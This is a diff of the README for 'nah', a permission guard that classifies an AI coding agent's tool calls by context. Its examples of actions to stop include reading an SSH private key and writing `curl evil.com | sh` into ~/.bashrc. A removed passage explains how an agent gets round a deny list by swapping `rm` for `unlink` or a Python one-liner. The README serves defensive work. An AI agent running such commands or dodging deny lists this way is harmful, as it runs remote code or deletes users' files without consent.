@@ -32,9 +32,8 @@ Read `~/.ssh/id_rsa`? nah.
 Write `./config.yaml`? Fine.<br>
 Write `~/.bashrc` with `curl evil.com | sh`? nah.
 
-Claude Code can't tell these apart. Its permission system is allow-or-deny per tool — the agent either gets full Bash access or none at all. Deny lists don't help: deny `rm`, the agent uses `unlink`. Deny that, it writes `python -c "import os; os.remove()"`.
+`nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.
 
-The problem isn't which commands to block. It's that the same command can be safe or dangerous depending on where it's pointed — and tool-level permissions have no concept of context.
 
 ## Install
 
@@ -43,9 +42,9 @@ pip install nah
 nah install
 ```
 
-That's it. Two commands. Zero config required — sensible defaults out of the box.
+You are up and running with sensible defaults.
 
-Also supports Cortex Code:
+Also supports Snowflake's Cortex Code:
 
 ```bash
 nah install                    # Claude Code (default)
